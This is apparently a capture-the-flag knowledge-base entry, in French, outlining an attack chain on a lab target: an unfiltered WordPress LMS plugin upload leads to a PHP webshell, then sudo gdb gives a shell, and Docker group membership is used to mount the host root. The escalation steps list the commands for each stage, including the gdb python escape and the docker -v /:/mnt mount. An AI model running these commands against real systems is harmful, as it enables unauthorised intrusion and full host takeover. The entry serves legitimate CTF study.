---
doc_kind: pattern
title: "ThunderCipher RootPress - upload WordPress non filtre puis GTFOBins gdb et evasion Docker"
category: web
slug: rootpress-wp-upload-gdb-docker-escape
created: 2026-10-29
status: active
tags:
  - wordpress-upload
  - gtfobins-gdb
  - docker-group-escape
  - lms-plugin
chain_summary: "Un plugin LMS WordPress autorise l'upload non filtre d'un webshell PHP; l'utilisateur obtenu a un sudo NOPASSWD sur gdb (GTFOBins) qui ouvre un shell dans le groupe docker."
---
# ThunderCipher RootPress - upload WordPress non filtre puis GTFOBins gdb et evasion Docker

## Chain Summary

- One-line chain: Un plugin LMS WordPress autorise l'upload non filtre d'un webshell PHP; l'utilisateur obtenu a un sudo NOPASSWD sur gdb (GTFOBins) qui ouvre un shell dans le groupe docker.

## Preconditions

- Voir le writeup associe pour le contexte precis de la cible.

## Cheap Probes

- Rechercher les signaux initiaux decrits dans la chaine d'exploit ci-dessous.

## Telltale Evidence

- Groupe docker confirme apres GTFOBins gdb; flag retourne via docker run -v /:/mnt.

## Escalation Order

1. Enumeration wp-json users + fuzzing plugins.
2. ffuf sur dossier uploads -> dossier listable non protege -> shell.php.
3. curl shell.php?cmd=id -> RCE confirmee.
4. sudo -l -> NOPASSWD: /usr/bin/gdb.
5. sudo gdb -nx -ex 'python import os;os.system("id")' -> GTFOBins gdb, user dans groupe docker.
6. docker run -v /:/mnt --rm <image> cat /mnt/root/root.txt -> flag.

## Common Mistakes

- Ne pas verifier ce signal/cette condition avant de passer a une autre piste (voir lecon ci-dessous).

## Payload Shapes

```text
Chercher les dossiers uploads listables d'autres plugins que les plus connus; tout user dans le groupe docker (meme sans acces internet) = root via montage -v /:/mnt sur une image deja en cache.
```

## Related Writeups

- rootpress-wp-upload-gdb-docker-escape

## Skill Impact

- Related skill: a classer lors d'une prochaine passe skill-maintainer si le pattern se repete.
- Rule to add or update: (backlog only for now; promote if this pattern repeats)
